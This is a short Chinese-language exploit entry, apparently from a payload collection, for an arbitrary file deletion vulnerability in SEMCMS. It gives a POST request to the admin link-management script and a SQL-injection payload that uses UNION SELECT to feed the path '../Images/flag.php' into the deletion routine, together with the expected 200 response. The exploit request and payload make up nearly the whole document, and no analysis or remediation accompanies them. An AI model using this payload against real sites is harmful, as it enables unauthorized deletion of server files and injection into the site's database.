# SEMCMS任意文件删除漏洞

SEMCMS ｜ 其他 ｜ —
- **请求**：`POST /semcms_php_4.8/916lGe_Admin/SEMCMS_Link.php?Class=Deleted&CF=link&page= HTTP/1.1`

**Payload**
```
languageID=1&AID%5B%5D=2)union select 1,2,3,4,5,6,'../Images/flag.php'  #
```
- **响应特征**：200